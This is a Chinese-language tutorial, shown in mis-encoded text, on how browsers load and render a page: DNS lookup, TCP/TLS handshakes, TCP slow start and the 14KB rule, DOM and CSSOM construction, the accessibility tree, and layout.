[{"content":"æµè§ˆå™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ æœ¬æ–‡å†…å®¹ä¸»è¦æ¥æºäºï¼šPopulating the page: how browsers workï¼Œå†åŠ ä¸Šæœ¬äººçš„ç†è§£ä»¥åŠæ‹“å±•çŸ¥è¯†çš„ä»‹ç»ï¼Œä½†æ˜¯è¿˜æ˜¯å»ºè®®å¤§å®¶å»é˜…è¯»è‹±æ–‡çš„å®˜æ–¹æ–‡æ¡£ï¼Œä¼šå¾—åˆ°æ›´å…¨é¢çš„ä¿¡æ¯ä»¥åŠæ‹“å±•èµ„æº å¿«é€Ÿå“åº”çš„ç½‘ç«™å¯ä»¥ä¸ºç”¨æˆ·æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œè¿™æ„å‘³ç€ç½‘ç«™çš„å†…å®¹å¯ä»¥:1)å¿«é€Ÿçš„è¢«åŠ è½½ï¼Œå¹¶ä¸”å¯ä»¥ 2)è¿›è¡Œæµç•…çš„äº’åŠ¨ã€‚ é‚£ä¹ˆè¦å®ç°è¿™ä¸¤ä¸ªéœ€æ±‚ï¼Œæˆ‘ä»¬å°±éœ€è¦è€ƒè™‘LatencyåŠ è½½ç­‰å¾…æ—¶é—´ï¼Œä»¥åŠè®¤è¯†åˆ°æµè§ˆå™¨å…¶å®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å•çº¿ç¨‹å·¥ä½œçš„ Latency, æ—¶å»¶ï¼Œæ˜¯æˆ‘ä»¬å®ç°å¿«é€Ÿå“åº”çš„ä¸»è¦é˜»åŠ›ï¼Œä¸ºäº†å®ç°å¿«é€Ÿå“åº”ï¼Œé™ä½æ—¶å»¶ï¼Œå¼€å‘è€…éœ€è¦å°½å¯èƒ½å¿«çš„å‘é€è¯·æ±‚ã€‚ åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨éƒ½æ˜¯å•çº¿ç¨‹åœ¨å·¥ä½œçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸ºäº†è®©ç½‘ç«™å¯ä»¥æµç•…çš„è®¿é—®ï¼Œä¸»è¦çš„ç›®æ ‡å°±æ˜¯ä¿è¯æµè§ˆå™¨çš„ä¸»çº¿ç¨‹åœ¨å®Œæˆæµè§ˆå™¨è¿è¡Œçš„å¤§éƒ¨åˆ†å·¥ä½œçš„åŒæ—¶ï¼Œè¿˜æœ‰ä½™åŠ›æ¥å¤„ç†ç”¨æˆ·çš„äº¤äº’ï¼Œé‚£ä¹ˆå¼€å‘è€…éœ€è¦è®¤è¯†åˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”å°½é‡é™ä½ä¸»çº¿ç¨‹æ‰€åˆ†é…åˆ°çš„ä»»åŠ¡ï¼Œä»è€Œä½¿ç½‘é¡µçš„æ¸²æŸ“ä»¥åŠç”¨æˆ·çš„äº¤äº’æ›´ä¸ºæµç•…ã€‚ Navigation å¯¼èˆª å¯¼èˆª æ˜¯åŠ è½½ç½‘é¡µçš„ç¬¬ä¸€æ­¥ï¼Œå¯¼èˆªå‘ç”Ÿåœ¨å½“ç”¨æˆ·é€šè¿‡å°†URLè¾“å…¥åœ°å€æ ï¼›ç‚¹å‡»é“¾æ¥ï¼›æäº¤è¡¨å•ä»¥åŠç±»ä¼¼çš„è¿™æ ·çš„æ“ä½œ å‡å°‘åœ¨å¯¼èˆªä¸Šçš„æ—¶é—´ä¹Ÿæ˜¯ä¼˜åŒ–ç½‘é¡µæ€§èƒ½çš„ä¸€ä¸ªé‡è¦ç›®æ ‡ï¼Œé˜»åŠ›æ¥æºäºæ—¶å»¶å’Œå¸¦å®½ DNS Lookup DNS æŸ¥è¯¢ å¯¹äºç½‘é¡µçš„å¯¼èˆªå§‹äºæ‰¾åˆ°èµ„æºçš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡URLæ¥å®šä½èµ„æºï¼Œæ¯”å¦‚æˆ‘ä»¬è¦è®¿é—® https://example.com, å…¶å¯¹åº”çš„IPåœ°å€æ˜¯ 93.184.216.34, ä¸Šé¢å­˜æ”¾ç€çš„å¯¹åº”çš„HTMLèµ„æºï¼Œä½†æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨æ­¤æ—¶è¿˜æ²¡æœ‰è®¿é—®è¿‡è¿™ä¸ªç½‘é¡µï¼Œå› æ­¤ç¬¬ä¸€æ­¥è¦åšçš„äº‹æƒ…å°±æ˜¯DNS lookup é€šè¿‡DNSæŸ¥è¯¢ï¼Œname serveræœ€ç»ˆä¼šè¿”å›ç»™æµè§ˆå™¨åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€ï¼Œè¿›è€Œå°†å…¶ç¼“å­˜ä»¥åŠ é€Ÿæœªæ¥çš„è®¿é—®é€Ÿåº¦ã€‚ é‚£ä¹ˆæˆ‘ä»¬å…·ä½“åˆ°ç½‘é¡µä¸Šæ¥ï¼ŒDNSæŸ¥è¯¢ä¸åªå‘ç”Ÿåœ¨ä¸»é¡µé¢çš„HTMLçš„è·å–ä¸Šï¼Œè¿˜éœ€è¦å¯¹HTMLä¸Šæ‰€å¼•ç”¨çš„èµ„æºé€ä¸€è¿›è¡Œå¯¼èˆªå’ŒDNSæŸ¥è¯¢ï¼Œè¿™å°±éœ€è¦å¼€å‘è€…å¯¹æ­¤è¿›è¡Œä¼˜åŒ–ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç§»åŠ¨ç«¯ç”¨æˆ·ï¼Œæ¯ä¸€æ¬¡DNSæŸ¥è¯¢éƒ½æ„å‘³ç€éœ€è¦é€šè¿‡ä¿¡å·å¡”æ¥è®¿é—®æˆæƒçš„DNS server,é‚£ä¹ˆæ ¹æ®ä¿¡å·å¡”çš„è·ç¦»å°±ä¼šäº§ç”Ÿä¸€å®šçš„æ—¶å»¶  Figure 1: DNS lookup on Mobile devices\n  TCP Handshake ç»è¿‡DNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»æ‹¿åˆ°äº†ç›®æ ‡ç½‘é¡µèµ„æºæ‰€å¤„çš„IPåœ°å€äº†ï¼Œæ¥ä¸‹æ¥å°±è¦è¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹æ¥è¿›è¡Œè¿æ¥ã€‚ é€šè¿‡\u0026quot;SYN, SYN-ACK, ACK\u0026quot; çš„ä¸‰æ¡TCPä¿¡æ¯æ¥å»ºç«‹TCPè¿æ¥ã€‚ TLS Negotiation åŒæ—¶ï¼Œä¸ºäº†ä¿è¯å®‰å…¨ï¼Œæˆ‘ä»¬æå€¡ä½¿ç”¨HTTPSåè®®ï¼Œå…¶è¦æ±‚åœ¨è¿›è¡ŒåŸºæœ¬çš„TCPä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œè¿›ä¸€æ­¥çš„â€œæ¡æ‰‹â€ï¼Œæ¥å»ºç«‹å®‰å…¨è¿æ¥ï¼Œä¹Ÿå°±æ˜¯TLS Negotiation è¿™å°†è¦æ±‚é¢å¤–çš„5æ¡ä¿¡æ¯ï¼Œç”¨æ¥å¯¹clientä»¥åŠserverè¿›è¡Œç›¸äº’è®¤è¯ï¼Œå¹¶ä¸”ç¡®è®¤è§£ç çš„å¯†é’¥ï¼Œæ¥ä¿è¯æ•°æ®çš„ä¿å¯†æ€§  Figure 2: TLS Negotiation\n  Response å“åº” ç°åœ¨æµè§ˆå™¨å·²ç»å’ŒæœåŠ¡å™¨å»ºç«‹äº†å®‰å…¨çš„TCPè¿æ¥äº†ï¼Œè¿™æ—¶æµè§ˆå™¨å°±ä¼šå‘é€ä¸€ä¸ªåˆå§‹çš„ HTTP GET request æ¥è¯·æ±‚ç½‘é¡µèµ„æºï¼Œè¿™é€šå¸¸æ˜¯ä¸€ä¸ªHTMLæ–‡ä»¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°äº†è¯·æ±‚ï¼Œæ¥ç€è¿”å›å¯¹åº”çš„HTTP headersä»¥åŠHTMLæ–‡ä»¶çš„å†…å®¹ ä¾‹å¦‚ï¼š \u0026lt;!doctype HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;title\u0026gt;My simple page\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; src=\u0026#34;styles.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;myscript.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 class=\u0026#34;heading\u0026#34;\u0026gt;My Page\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;A paragraph with a \u0026lt;a href=\u0026#34;https://example.com/about\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;myimage.jpg\u0026#34; alt=\u0026#34;image description\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;anotherscript.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Time to First Byte (TTFB) è¡¨ç¤ºä»ç”¨æˆ·å‘å‡ºè¯·æ±‚ï¼ˆç‚¹å‡»è¿æ¥ï¼‰åˆ°æ”¶åˆ°ç¬¬ä¸€ä¸ªHTMLçš„æ•°æ®åŒ…çš„æ—¶é—´ï¼Œé€šå¸¸ç¬¬ä¸€å—ä¿¡æ¯çš„å¤§å°æ˜¯14KBçš„æ•°æ® ä¸‹é¢æˆ‘ä»¬ä¼šè§£é‡Šä¸ºä»€ä¹ˆç¬¬ä¸€å—ä¿¡æ¯æ˜¯14KBçš„ã€‚ Congestion control: TCP Slow Start /14 KB rule TCPæ…¢å¯åŠ¨ ç°åœ¨å·²ç»å»ºç«‹äº†å®‰å…¨çš„è¿æ¥ï¼Œæ¥ä¸‹æ¥æœåŠ¡å™¨å°†ä¼šæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚è¿”å›å¯¹åº”çš„æ•°æ®ï¼Œä½†æ˜¯ä¼ è¾“çš„é€Ÿåº¦ï¼ˆå•ä½æ—¶é—´å†…ä¼ è¾“çš„æ•°æ®ï¼‰å¹¶ä¸æ˜¯ä»ä¸€å¼€å§‹å°±è¾¾åˆ°æœ€ä¼˜çš„é€Ÿåº¦çš„ï¼Œè€Œæ˜¯æ…¢æ…¢å¢åŠ çš„ï¼Œä¸ºçš„æ˜¯é˜²æ­¢ ç½‘ç»œæ‹¥å¡ ã€‚ ç½‘ç»œæ‹¥å¡ï¼šç½‘ç»œæ‹¥å¡å°±æ˜¯ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹éœ€è¦å¤„ç†å¤§äºä»–ä»¬èƒ½åŠ›çš„æ•°æ®æ—¶ï¼Œç½‘ç»œçš„æ€§èƒ½å°±ä¼šå˜åŒ–ï¼Œä¹Ÿå°±ä¼šå‘ç”Ÿæ‹¥å¡ï¼Œä¾‹å¦‚è·¯ç”±å™¨æˆ–è€…ç”¨æˆ·çš„è®¾å¤‡å¯¹äºæ¥æ”¶åˆ°çš„æ•°æ®çš„å¤„ç†é€Ÿåº¦è·Ÿä¸ä¸Šæ¥æ”¶é€Ÿåº¦ï¼Œé‚£ä¹ˆè®¾å¤‡çš„ç¼“å­˜å°±ä¼šè¢«å æ»¡ï¼Œå†æ¥æ”¶åˆ°çš„æ•°æ®å°±ä¼šè¢«ä¸¢å¼ƒï¼Œå¯¼è‡´ç½‘ç»œæ€§èƒ½ä¸‹é™ã€‚ åœ¨ç½‘ç»œå±‚å°±ä¼šå‘ç”Ÿä¸¢åŒ…çš„ç°è±¡ï¼Œè€Œä¸»è¦çš„æ‹¥å¡æ§åˆ¶å°±å‘ç”Ÿåœ¨ä¼ è¾“å±‚ä¸Š TCPæ…¢å¯åŠ¨å°±æ˜¯ä¸€ä¸ªç”¨æ¥æ£€æµ‹æ•°æ®ä¼ è¾“å¯ä½¿ç”¨çš„å¸¦å®½ï¼ŒåŒæ—¶å¹³è¡¡ç½‘ç»œè¿æ¥é€Ÿåº¦çš„ç®—æ³•ï¼Œå…¶é€šè¿‡é€æ¸å¢åŠ æ•°æ®ä¼ è¾“é€Ÿåº¦æ¥æ‰¾åˆ°æœ€å¥½çš„ä¼ è¾“é€Ÿåº¦ï¼Œä»è€Œé˜²æ­¢ ç½‘ç»œå µå¡ çš„å‘ç”Ÿã€‚ åœ¨è®²è§£ç®—æ³•çš„å…·ä½“æµç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€äº›ç›¸å…³æ¦‚å¿µ  congestion window (cwnd) æ‹¥å¡çª—å£ï¼Œå‘é€æ–¹çš„è®¾ç½®ï¼Œè¡¨ç¤ºåœ¨æ”¶åˆ°æ¥æ”¶æ–¹ACKä¹‹å‰ï¼Œå‘é€æ–¹æœ€å¤§å…è®¸ä¼ è¾“çš„æ•°æ®å¤§å°  slow start threshold (ssthresh) æ¥è®¾å®šæ…¢å¯åŠ¨ç®—æ³•ä½¿ç”¨çš„é˜ˆå€¼  Round-Trip Time (RTT) å¾€è¿”æ—¶å»¶ï¼Œè¡¨ç¤ºä»å‘é€æ–¹å‘å‡ºæ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€å‘æ”¶åˆ°æ¥è‡ªæ¥æ”¶æ–¹çš„ACKï¼Œæ‰€ç»å†çš„æ‰€æœ‰æ—¶å»¶  Maximum Transmission Unit (MTU) MTUæ˜¯å¯ä»¥åœ¨ç½‘ç»œå±‚å¯ä»¥é€šä¿¡çš„æœ€å¤§PDUçš„å¤§å°ï¼Œå…¶åº”ç”¨äºç½‘ç»œå±‚ï¼Œå•ä½ä¸€èˆ¬ç”¨å­—èŠ‚æ¥è®¾å®š åœ¨ä»¥å¤ªç½‘ä¸­ï¼Œæœ€å¤§çš„frameä¸º1518 bytesï¼Œå…¶ä¸­18bytesæ˜¯overheadï¼ˆheaderså’Œæ£€æŸ¥å€¼ï¼‰ï¼ŒMTUçš„å€¼å°±æ˜¯1500 bytes  Protocol data unit (PDU) PDU æ˜¯åŒä¸€å±‚çš„é€šä¿¡åè®®ä¹‹é—´é€šä¿¡çš„æœ€å°ä¿¡æ¯å•ä½ï¼Œä¾‹å¦‚åœ¨OSIæ¨¡å‹ä¸­ï¼š    Layer PDU     The Layer 4: Transport Layer segment(TCP)/datagram(UDP)   The Layer 3: Network Layer packet   The Layer 2: Data link layer frame   The Layer 1: Physical layer bit, or more generally, symbol     Maximum Segment Size (MSS) æœ€å¤§TCP segmentçš„å¤§å°ï¼Œæ˜¯TCPçš„ä¸€ä¸ªå‚æ•° æ ¹æ®å®šä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼šä¸€ä¸ªTCP segmentçš„payload \u0026lt; MSS \u0026lt; MTU   cwnd \u0026lt; ssthreshï¼Œæ…¢å¯åŠ¨ç®—æ³•  å½“ä¸€ä¸ªæ–°çš„è¿æ¥å»ºç«‹ä¹‹åï¼Œå‘é€æ–¹å°†åˆå§‹åŒ– cwnd = 1ï¼ˆ2013å¹´çš„RFC6928è§„å®šä¸€ä¸ªcwndè¡¨ç¤º10ä¸ªTCP segmentï¼‰  æ¯è¿‡ä¸€ä¸ªRTTï¼Œå³æ”¶åˆ°ACKä¹‹åï¼Œcwnd = cwnd * 2ï¼Œå‘ˆæŒ‡æ•°å¢é•¿   cwnd = sshtresh æ…¢å¯åŠ¨ä¸æ‹¥å¡é¿å…ç®—æ³•éƒ½å¯ cwnd \u0026gt; sshtreshï¼Œæ”¹ç”¨æ‹¥å¡é¿å…ç®—æ³•,æˆ‘ä»¬è¿™é‡Œä»‹ç» Additive increase/multiplicative decrease, AIMDç®—æ³•ï¼ˆåŠ æ³•å¢åŠ ä¹˜æ³•å‡å°ç®—æ³•ï¼‰  åœ¨cwndå¤§äºsshtreshä¹‹åï¼Œæ¯å½“å‘é€æ–¹æ”¶åˆ°ä¸€ä¸ªACKä¹‹åï¼Œ++cwnd;å‘ˆçº¿æ€§ä¸Šå‡ï¼Œè¿™å°±æ˜¯ åŠ æ³•å¢åŠ   ä¸€æ—¦å‡ºç°ç½‘ç»œæ‹¥å¡ï¼Œå°±è¿›è¡Œ ä¹˜æ³•å‡å° å³å°† sshtresh = cwnd/2ï¼› cwnd = 1  æ¥ç€åˆ‡æ¢åˆ°æ…¢å¯åŠ¨ç®—æ³•é‡æ–°å¼€å§‹    Figure 3: TCP Slow start \u0026amp; AIMD\n  Parsing è§£æ å½“æµè§ˆå™¨æ”¶åˆ°äº†ç¬¬ä¸€å—æ•°æ®ï¼Œå®ƒå°±ä¼šç›´æ¥å¼€å§‹è§£ææ”¶åˆ°çš„ä¿¡æ¯ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯å°†æ¥æ”¶åˆ°çš„æ•°æ®è½¬æ¢ä¸º DOM \u0026amp; CSSOM, è¿™ä¸¤ä¸ªç»“æ„æ˜¯æ¸²æŸ“å™¨ç”¨æ¥ç»˜åˆ¶ç½‘é¡µçš„ DOM, Document Object Model, æ˜¯ä¸€ä¸ªç”¨æ¥å°†XMLæˆ–è€…HTMLè½¬æ¢ä¸ºæ ‘ç»“æ„çš„è·¨å¹³å°ï¼Œç‹¬ç«‹äºè¯­è¨€çš„APIï¼Œå¯ä»¥é€šè¿‡JSè°ƒç”¨APIæ¥è¿›è¡Œä¿®æ”¹ã€‚ å³ä½¿è¯·æ±‚çš„HTMLæ–‡ä»¶å¤§äº14KBï¼Œæµè§ˆå™¨ä»ç„¶ä¼šç›´æ¥å°è¯•è§£æå¹¶æ¸²æŸ“ç¬¬ä¸€å—14KBçš„æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆå¼€å‘è€…åœ¨åšwebæ€§èƒ½ä¼˜åŒ–çš„æ—¶å€™ï¼Œéœ€è¦å°†CSSä»¥åŠHTMLæ§åˆ¶åœ¨14KBä¹‹å†…ï¼Œä»¥æ­¤æ¥ä¿éšœç½‘é¡µèƒ½å¤ŸæˆåŠŸè¿›è¡Œåˆçº§æ¸²æŸ“ã€‚ ä¸€ä¸ªTCP packetæœ€å¤§å¯ä»¥è¾¾åˆ°1500 bytesï¼ŒåŒæ—¶å…¶ä¸­æœ‰40 byteséœ€è¦åˆ«ç”¨ä½œTCPåè®®ï¼ˆTCP headersï¼‰ï¼Œé‚£ä¹ˆä¹Ÿå°±å‰©ä¸‹1460 bytesæ¥æ‰¿è½½å®é™…çš„æ•°æ®ï¼Œé‚£ä¹ˆåä¸ªTCP packetså°±æ˜¯14,600 bytesä¹Ÿå°±æ˜¯å¤§çº¦14KBçš„æ•°æ®ï¼ˆæ…¢å¯åŠ¨ä¸€èˆ¬ä¼šä»åä¸ªTCPæ•°æ®åŒ…å¼€å§‹ä¼ è¾“ï¼‰ï¼šCritical Resources and the First 14 KB - A Review æ¥ä¸‹æ¥æˆ‘ä»¬å°±ä¼šä»‹ç» å…³é”®æ¸²æŸ“ è·¯å¾„çš„äº”ä¸ªæ­¥éª¤ï¼Œå³æµè§ˆå™¨å¦‚ä½•å°†HTMLï¼ŒCSSä»¥åŠJSè½¬æ¢æˆå±å¹•çš„åƒç´  Building the DOM tree æ„å»ºDOM ç¬¬ä¸€æ­¥å°±æ˜¯å¤„ç†HTMLæ ‡ç­¾ä»è€Œæ„é€ DOMæ ‘ã€‚ HTMLçš„è§£ææ¶‰åŠåˆ° tokenisation ä»¥åŠæ ‘çš„æ„é€  æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸‹å›¾æ¥çœ‹åˆ°DOMæ˜¯å¦‚ä½•åŒé€šè¿‡HTMLæ ‡ç­¾æ¥æ„é€ æ ‘çš„ï¼š \u0026lt;html\u0026gt; æ˜¯ç¬¬ä¸€ä¸ªæ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯DOM treeçš„æ ¹èŠ‚ç‚¹ï¼Œå…¶ä»–çš„æ ‡ç­¾å°±ä½œä¸ºå­èŠ‚ç‚¹æ ¹æ®å¯¹åº”çš„ç»“æ„è¿›è¡Œç»„åˆ  Figure 4: DOM tree\n  åœ¨è§£æHTMLæ ‡ç­¾çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°non-blockingéé˜»å¡ï¼ˆæ¸²æŸ“ï¼‰çš„èµ„æºï¼Œä¾‹å¦‚å›¾ç‰‡ï¼Œæµè§ˆå™¨ä¼šè¯·æ±‚è¿™äº›èµ„æºï¼Œå¹¶ç»§ç»­è¿›è¡Œè§£æ ä½†æ˜¯å½“ç¢°åˆ° \u0026lt;script\u0026gt; æ ‡ç­¾ï¼Œç‰¹åˆ«æ˜¯é‚£äº›ä¸æ˜¯ async(å¼‚æ­¥) çš„è„šæœ¬æ ‡ç­¾ï¼Œè¿™å°†ä½¿æ¸²æŸ“ä»¥åŠè§£æéƒ½åœæ­¢ï¼Œè¿™å°†å¯¹æ€§èƒ½äº§ç”Ÿå½±å“ Preload scanner é¢„åŠ è½½æ‰«æå™¨ å½“æµè§ˆå™¨åœ¨æ„å»ºDOM treeæ—¶ï¼ŒPreload scannerå°±ä¼šå æ®ä¸»çº¿ç¨‹ï¼Œå¹¶åŒæ­¥å¼€å§‹è¯·æ±‚é«˜ä¼˜å…ˆçº§çš„èµ„æºï¼Œä»¥æ­¤ä¿è¯è§£æä¸ä¼šå¡åœ¨è¿™äº›èµ„æºçš„è·å–ä¸Šï¼Œä¾‹å¦‚CSS, JS, images, web fontsã€‚ ä¾‹å¦‚ä¸‹åˆ—æ ‡ç­¾å°±ä¼šåœ¨HTMLè§£æçš„è¿‡ç¨‹ä¸­ï¼Œè¢«preload scanner æ‰€è¯·æ±‚è·å– \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; src=\u0026#34;styles.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;myscript.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;myimage.jpg\u0026#34; alt=\u0026#34;image description\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;anotherscript.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; Building the CSSOM ç¬¬äºŒæ­¥å°±æ˜¯æ„å»ºCSSOMæ ‘ï¼ŒCSSOMæ ‘ä¸DOMç±»ä¼¼ï¼Œåªä¸è¿‡å¤„ç†çš„æ˜¯CSSè€ŒéHTMLï¼Œé€šè¿‡å°†CSSè§„åˆ™ä»¥åŠCSS selectorsæ‰€åˆ¶å®šçš„å…³ç³»ç»“æ„è½¬æ¢ä¸ºä¸€ä¸ªæ ‘çš„ç»“æ„  Figure 5: CSSOM\n  Other Processes   JavaScript Compilation\nå½“CSSåœ¨è¢«è§£æå¹¶æ„å»ºCSSOMçš„åŒæ—¶ï¼ŒJSæ–‡ä»¶ä¹Ÿåœ¨è¢«ä¸‹è½½ï¼Œè§£é‡Šï¼Œç¼–è¯‘ï¼Œè§£æä»¥åŠæ‰§è¡Œï¼Œè¿™äº›è„šæœ¬ä¼šè¢«è§£æå¹¶å­˜å…¥ Abstract syntax treeï¼ŒæŠ½è±¡è¯­æ³•æ ‘  Figure 6: AST\n      Building the Accessibility Tree æ„å»ºè¾…åŠ©åŠŸèƒ½æ ‘\næµè§ˆå™¨è¿˜ä¼šæ„å»º accessiblity tree æ¥è¾…åŠ©è®¾å¤‡æ¥è§£æå’Œè§£é‡Šå†…å®¹ï¼Œaccessibility object model (AOM) æ‹¥æœ‰ä¸DOMç±»ä¼¼çš„è¯­æ³•ç»“æ„ï¼ŒAOMä¸€èˆ¬æ¥è¯´æ˜¯æ— æ³•è®¿é—®çš„ã€‚ åœ¨AOMè¢«æ„å»ºä¹‹å‰ï¼Œæ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯æ— æ³•è¢«å±å¹•é˜…è¯»å™¨æ‰€è®¿é—®çš„ é‚£åˆ°åº•ä»€ä¹ˆæ˜¯Accessibilityè¾…åŠ©åŠŸèƒ½ï¼Œå®ƒæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Œç›¸ä¿¡å¤§å®¶éƒ½åœ¨æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·é‡Œçœ‹åˆ°è¿‡è¿™ä¸ªåŠŸèƒ½ï¼Œç”šè‡³åœ¨ç”µè„‘ï¼Œæ‰‹æœºéƒ½æœ‰çœ‹åˆ°è¿‡è¿™ä¸ªåŠŸèƒ½ï¼Œå¤§æ¦‚çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ–¹ä¾¿disableæ¥ä½¿ç”¨ç”µå­è®¾å¤‡çš„åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬å¹³æ—¶å´å¾ˆå°‘ä½¿ç”¨ã€‚ Accessibility çš„ç›®æ ‡æ˜¯ä½¿å°½å¯èƒ½å¤šçš„äººèƒ½å¤Ÿæ›´å¥½çš„è®¿é—®ç½‘é¡µï¼Œä¸ä»…ä»…æ˜¯æœ‰éšœç¢çš„äººå£«ï¼ŒåŒæ—¶ä¹Ÿå¸®åŠ©é‚£äº›ä½¿ç”¨ç§»åŠ¨ç«¯è®¾å¤‡æˆ–è€…ç½‘é€Ÿå¾ˆæ…¢çš„ç”¨æˆ·ç¾¤ä½“ã€‚ Firefoxå†…ç½®äº†Accessibility APIsæ¥å¯¹ç½‘é¡µçš„å†…å®¹è¿›è¡Œè§£æï¼Œåˆ†æä¸åŒçš„å…ƒç´ çš„åŠŸèƒ½ä¸è§’è‰²ï¼Œä»è€Œå¹¶æ„é€ AOMï¼ŒåŒæ—¶æ ¹æ®ä¸€äº›ç½‘é¡µè®¾è®¡çš„æ ‡å‡†æ¥åˆ¤æ–­å¼€å‘æ˜¯å¦è§„èŒƒï¼Œä¾‹å¦‚HTMLæ ‡ç­¾æ˜¯å¦ä½¿ç”¨å¾—å½“ï¼Œæ–‡å­—çš„å¤§å°ï¼Œæ¯”ä¾‹ï¼Œé¢œè‰²ï¼Œå¯¹æ¯”åº¦ç­‰å†…å®¹æ˜¯å¦é€‚åˆä¸ä¸åŒçš„è®¾å¤‡ï¼Œå¯¹è§†åŠ›æœ‰éšœç¢çš„äººå£«æ˜¯å¦å‹å¥½ã€‚ Firefoxå®˜æ–¹çš„ä¸€ä¸ªè§†é¢‘å±•ç¤ºäº†ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œå¯¹äºä¸€ä¸ªç½‘é¡µçš„å†…å®¹ï¼Œæ™®é€šäººå¯ä»¥è¿›è¡Œæ­£å¸¸çš„é˜…è¯»ï¼Œä½†æ˜¯å½“è¿™ä¸ªå†…å®¹åœ¨è§†åŠ›æœ‰éšœç¢çš„äººå£«ä½¿ç”¨å·¥å…·è¿›è¡Œæœ—è¯»çš„æ—¶å€™ï¼Œä¹Ÿè®¸å°±ä¼šå‡ºç°é—®é¢˜ï¼Œè¿™ä¹Ÿä½“ç°äº†Accessibilityçš„ä½œç”¨   Render æ¸²æŸ“ æ¸²æŸ“çš„æ­¥éª¤åŒ…æ‹¬è®¡ç®—æ ·å¼ï¼ˆstyleï¼‰ï¼Œè®¡ç®—å¸ƒå±€ï¼ˆlayoutï¼‰ï¼Œæœ€åç»˜åˆ¶ï¼ˆpaintï¼‰ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿˜åŒ…å«äº†åˆæˆã€‚ Style å…³é”®æ¸²æŸ“è·¯å¾„çš„ç¬¬ä¸‰æ­¥å°±æ˜¯å°†DOMä»¥åŠCSSOMç»“åˆåˆ°render treeæ¸²æŸ“æ ‘/ computed style tree è®¡ç®—å¾—åˆ°çš„æ ·å¼æ ‘ä¸­ï¼š å¯¹äºæ¯ä¸€ä¸ªDOMæ ‘ä¸­çš„å¯è§†èŠ‚ç‚¹ï¼Œéƒ½ä¼šå°†CSSOMä¸­å¯¹åº”çš„æ ·å¼ä¸å…¶é…å¥— Layout åœ¨ç¡®å®šäº†æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„æ ·å¼å®Œæˆæ¸²æŸ“æ ‘ä¹‹åï¼Œç¬¬å››æ­¥å°±æ˜¯è¦è€ƒè™‘å¦‚ä½•å¯¹æ‰€æœ‰çš„è¿™äº›å…ƒç´ è¿›è¡Œæ’åˆ—ï¼Œé€šè¿‡ä»æ¸²æŸ“æ ‘çš„æ ¹å¼€å§‹ä¾¿åˆ©ï¼Œå¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å‡ ä½•ä¿¡æ¯è¿›è¡Œè®¡ç®—ï¼Œä¾‹å¦‚å®½åº¦å’Œé«˜åº¦ï¼Œä»¥åŠåœ¨é¡µé¢ä¸­çš„ä½ç½® ç¬¬ä¸€æ¬¡å¯¹äºä½ç½®ä»¥åŠå¤§å°çš„è®¡ç®—æˆ‘ä»¬æˆä¸º layout, å½“æˆ‘ä»¬å†æ¬¡ç¡®å®šé¡µé¢ä¸­ä¸€äº›èµ„æºçš„å¤§å°ä¾‹å¦‚å›¾ç‰‡åŠ è½½å®Œæˆä¹‹åï¼Œé‡æ–°è¿›è¡Œè®¡ç®—å«åš reflows å›æµ Paint 